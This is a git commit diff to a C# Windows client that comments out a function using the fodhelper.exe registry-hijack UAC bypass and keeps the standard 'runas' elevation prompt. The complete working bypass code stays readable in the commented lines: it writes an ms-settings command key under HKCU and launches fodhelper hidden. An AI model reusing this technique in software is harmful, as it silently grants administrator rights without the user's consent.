83c515542c739184377e11ddbf4601cde347a84d
Aigio <Aigio@AIGIO-NUC11PAHI>
2023-08-31 18:06:35 +0800

    🔥 StartAsAdministratorByBypassUAC

--- src/BD.WTTS.Client/Services.Implementation/Platform/Windows/WindowsPlatformServiceImpl.BypassUAC.cs
+++ src/BD.WTTS.Client/Services.Implementation/Platform/Windows/WindowsPlatformServiceImpl.BypassUAC.cs
@@ -105,115 +105,115 @@ partial class WindowsPlatformServiceImpl
         return false;
     }
 
-    /// <summary>
-    /// 使用 BypassUAC 以管理员权限启动进程
-    /// </summary>
-    /// <param name="fileName"></param>
-    /// <param name="arguments"></param>
-    /// <returns></returns>
-    [MethodImpl(MethodImplOptions.AggressiveInlining)]
-    internal static async Task<Process?> StartAsAdministratorByBypassUAC(string fileName, string? arguments = null)
-    {
-        /** 33. Author: winscripting.blog
-         * https://github.com/hfiref0x/UACME
-         * https://github.com/FatRodzianko/SharpBypassUAC/blob/67a9a3e4500731881f60863454e4e42ef46874e0/SharpBypassUAC/FodHelper.cs
-         * Type: Shell API
-         * Method: Registry key manipulation
-         * Target(s): \system32\fodhelper.exe
-         * Component(s): Attacker defined
-         * Implementation: ucmShellRegModMethod
-         * Works from: Windows 10 TH1 (10240)
-         * Fixed in: unfixed 🙈
-         * How: -
-         * Code status: added in v2.7.2
-         */
-        RegistryKey? classes = null;
-        var targetName = Path.Combine(Environment.GetFolderPath(
-            Environment.SpecialFolder.System),
-            "fodhelper.exe");
-        try
-        {
-            if (!File.Exists(targetName))
-                return null;
+    //    /// <summary>
+    //    /// 使用 BypassUAC 以管理员权限启动进程
+    //    /// </summary>
+    //    /// <param name="fileName"></param>
+    //    /// <param name="arguments"></param>
+    //    /// <returns></returns>
+    //    [MethodImpl(MethodImplOptions.AggressiveInlining)]
+    //    internal static async Task<Process?> StartAsAdministratorByBypassUAC(string fileName, string? arguments = null)
+    //    {
+    //        /** 33. Author: winscripting.blog
+    //         * https://github.com/hfiref0x/UACME
+    //         * https://github.com/FatRodzianko/SharpBypassUAC/blob/67a9a3e4500731881f60863454e4e42ef46874e0/SharpBypassUAC/FodHelper.cs
+    //         * Type: Shell API
+    //         * Method: Registry key manipulation
+    //         * Target(s): \system32\fodhelper.exe
+    //         * Component(s): Attacker defined
+    //         * Implementation: ucmShellRegModMethod
+    //         * Works from: Windows 10 TH1 (10240)
+    //         * Fixed in: unfixed 🙈
+    //         * How: -
+    //         * Code status: added in v2.7.2
+    //         */
+    //        RegistryKey? classes = null;
+    //        var targetName = Path.Combine(Environment.GetFolderPath(
+    //            Environment.SpecialFolder.System),
+    //            "fodhelper.exe");
+    //        try
+    //        {
+    //            if (!File.Exists(targetName))
+    //                return null;
 
-            var processPath = Environment.ProcessPath;
-            processPath.ThrowIsNull();
-            if (fileName != processPath) // 仅允许启动自己
-                throw new ArgumentOutOfRangeException(nameof(fileName));
+    //            var processPath = Environment.ProcessPath;
+    //            processPath.ThrowIsNull();
+    //            if (fileName != processPath) // 仅允许启动自己
+    //                throw new ArgumentOutOfRangeException(nameof(fileName));
 
-            var processName = Path.GetFileNameWithoutExtension(fileName);
-            if (string.IsNullOrWhiteSpace(processName))
-                throw new ArgumentNullException(nameof(processName));
+    //            var processName = Path.GetFileNameWithoutExtension(fileName);
+    //            if (string.IsNullOrWhiteSpace(processName))
+    //                throw new ArgumentNullException(nameof(processName));
 
-            classes = Registry.CurrentUser.OpenSubKey(@"Software\Classes", true);
-            using var command = classes!.CreateSubKey(@"ms-settings\Shell\Open\command", true);
-            command.SetValue("DelegateExecute", "");
-            command.SetValue("", string.IsNullOrWhiteSpace(arguments) ?
-                $"\"{fileName}\"" : $"\"{fileName}\" {arguments}");
+    //            classes = Registry.CurrentUser.OpenSubKey(@"Software\Classes", true);
+    //            using var command = classes!.CreateSubKey(@"ms-settings\Shell\Open\command", true);
+    //            command.SetValue("DelegateExecute", "");
+    //            command.SetValue("", string.IsNullOrWhiteSpace(arguments) ?
+    //                $"\"{fileName}\"" : $"\"{fileName}\" {arguments}");
 
-            ProcessStartInfo psi = new()
-            {
-                UseShellExecute = true,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                FileName = targetName,
-            };
-            var processs_start_before = new HashSet<int>(
-                Process.GetProcessesByName(processName).Select(x => x.Id));
-            var process = Process.Start(psi);
-            process!.WaitForExit(6000);
+    //            ProcessStartInfo psi = new()
+    //            {
+    //                UseShellExecute = true,
+    //                WindowStyle = ProcessWindowStyle.Hidden,
+    //                FileName = targetName,
+    //            };
+    //            var processs_start_before = new HashSet<int>(
+    //                Process.GetProcessesByName(processName).Select(x => x.Id));
+    //            var process = Process.Start(psi);
+    //            process!.WaitForExit(6000);
 
-            Dictionary<int, bool> mIsProcessElevated = new();
-            for (int i = 0; i < 7; i++)
-            {
-                var processs_start_after = Process.GetProcessesByName(processName);
-                foreach (var item in processs_start_after)
-                {
-                    if (item.Id == Environment.ProcessId)
-                        continue;
-                    if (processs_start_before.Contains(item.Id))
-                        continue;
+    //            Dictionary<int, bool> mIsProcessElevated = new();
+    //            for (int i = 0; i < 7; i++)
+    //            {
+    //                var processs_start_after = Process.GetProcessesByName(processName);
+    //                foreach (var item in processs_start_after)
+    //                {
+    //                    if (item.Id == Environment.ProcessId)
+    //                        continue;
+    //                    if (processs_start_before.Contains(item.Id))
+    //                        continue;
 
-                    if (mIsProcessElevated.TryGetValue(item.Id, out var value))
-                    {
-                        return item;
-                    }
-                    else
-                    {
-                        var isProcessElevated = IsProcessElevated(item);
-                        if (isProcessElevated)
-                            return item;
-                        mIsProcessElevated.Add(item.Id, isProcessElevated);
-                    }
-                }
+    //                    if (mIsProcessElevated.TryGetValue(item.Id, out var value))
+    //                    {
+    //                        return item;
+    //                    }
+    //                    else
+    //                    {
+    //                        var isProcessElevated = IsProcessElevated(item);
+    //                        if (isProcessElevated)
+    //                            return item;
+    //                        mIsProcessElevated.Add(item.Id, isProcessElevated);
+    //                    }
+    //                }
 
-                await Task.Delay(800);
-            }
+    //                await Task.Delay(800);
+    //            }
 
-            return null;
-        }
-        catch (Exception ex)
-        {
-#if DEBUG
-            Log.Error(TAG, ex, "StartAsAdministratorByBypassUAC fail.");
-#endif
-        }
-        finally
-        {
-            if (classes != null)
-            {
-                try
-                {
-                    classes.DeleteSubKeyTree("ms-settings");
-                }
-                catch
-                {
+    //            return null;
+    //        }
+    //        catch (Exception ex)
+    //        {
+    //#if DEBUG
+    //            Log.Error(TAG, ex, "StartAsAdministratorByBypassUAC fail.");
+    //#endif
+    //        }
+    //        finally
+    //        {
+    //            if (classes != null)
+    //            {
+    //                try
+    //                {
+    //                    classes.DeleteSubKeyTree("ms-settings");
+    //                }
+    //                catch
+    //                {
 
-                }
-                classes.Dispose();
-            }
-        }
-        return null;
-    }
+    //                }
+    //                classes.Dispose();
+    //            }
+    //        }
+    //        return null;
+    //    }
 
     /// <summary>
     /// 以管理员权限启动进程
@@ -221,18 +221,18 @@ partial class WindowsPlatformServiceImpl
     /// <param name="fileName"></param>
     /// <param name="arguments"></param>
     /// <returns></returns>
-    internal static async ValueTask<Process?> StartAsAdministrator(string fileName, string? arguments = null)
+    internal static /*async*/ ValueTask<Process?> StartAsAdministrator(string fileName, string? arguments = null)
     {
 #if !DEBUG
         if (IsPrivilegedProcess)
-            return Process2.Start(fileName, arguments);
+            return ValueTask.FromResult(Process2.Start(fileName, arguments));
 #endif
-        if (!DesktopBridge.IsRunningAsUwp)
-        {
-            var process = await StartAsAdministratorByBypassUAC(fileName, arguments);
-            if (process != null)
-                return process;
-        }
+        //if (!DesktopBridge.IsRunningAsUwp)
+        //{
+        //    var process = await StartAsAdministratorByBypassUAC(fileName, arguments);
+        //    if (process != null)
+        //        return process;
+        //}
 
         try
         {
@@ -244,11 +244,11 @@ partial class WindowsPlatformServiceImpl
                 Verb = "runas",
             };
             var process_runas = Process.Start(psi);
-            return process_runas;
+            return ValueTask.FromResult(process_runas);
         }
         catch
         {
-            return null;
+            return ValueTask.FromResult<Process?>(null);
         }
     }
 }
